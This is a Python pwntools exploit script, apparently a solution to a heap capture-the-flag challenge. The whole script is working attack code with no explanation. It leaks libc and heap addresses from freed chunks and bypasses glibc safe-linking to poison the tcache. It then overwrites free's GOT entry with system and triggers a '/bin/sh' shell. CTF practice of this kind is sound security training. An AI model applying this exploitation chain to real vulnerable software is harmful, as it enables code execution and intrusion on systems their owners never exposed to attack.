#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'debug'
gs = '''
c
set solib-search-path /home/huhu/my-task/pwn/daily-task/bai13/
'''

def start():
    if args.GDB:
        return gdb.debug(exe.path, gdbscript=gs)
    else:
        return process(exe.path)
p = start()
def init(name, desc):
    p.sendafter(b"Enter author name: ", name)
    p.sendafter(b"Enter introduction: ", desc)
def choice(index):
    p.sendlineafter(b"> ", str(index).encode())
def malloc(index, size):
    choice(1)
    p.sendlineafter(b"Please input the chunk index: ", str(index).encode())
    p.sendlineafter(b"Please input the size: ", str(size).encode())
def free(index):
    choice(5)
    p.sendlineafter(b"Please input the chunk index: ", str(index).encode())
def show(index):
    choice(4)
    p.sendlineafter(b"Please input the chunk index: ", str(index).encode())
def edit(index, size, content):
    choice(6)
    p.sendlineafter(b"Please input the chunk index: ", str(index).encode())
    p.sendlineafter(b"Please input the size: ", str(size).encode())
    p.sendafter(b"Please input the content: ", content)
init(b"A"*0x20, b"B"*0x40)
malloc(0, 0x410)
malloc(1, 0x410)
malloc(2, 0x410)
malloc(3, 0x410)
free(0)
free(2)
show(0)
p.recvuntil(b"Content: ")
libc_base = u64(p.recv(6) + b"\x00" + b"\x00") - (libc.symbols['main_arena'] + 0x60)
log.info(f"[*]libc = {hex(libc_base)}")
show(2)
p.recvuntil(b"Content: ")
heap_base = u64(p.recv(4) + b"\x00" + b"\x00" + b"\x00" + b"\x00")
log.info(f"[*]heap = {hex(heap_base)}")
free(1)
free(3)
malloc(0, 0x80)
malloc(1, 0x80)
free(1)
free(0)
edit(0, 0x8 ,p64(exe.symbols['chunks'] ^ ((heap_base + 0xa0) >> 12)))
malloc(0, 0x80)
malloc(1, 0x80)
malloc(2, 0x80)
edit(1, 0x24, p64(0x80) + p64(next(libc.search(b"/bin/sh\x00")) + libc_base) + p64(0x80) + p64(exe.got['free']))
edit(1, 0x8, p64(libc.symbols['system'] + libc_base))
free(0)
p.sendline(b"echo SAFE_LINK_OK")
p.sendline(b"id")
p.sendline(b"exit")
p.interactive()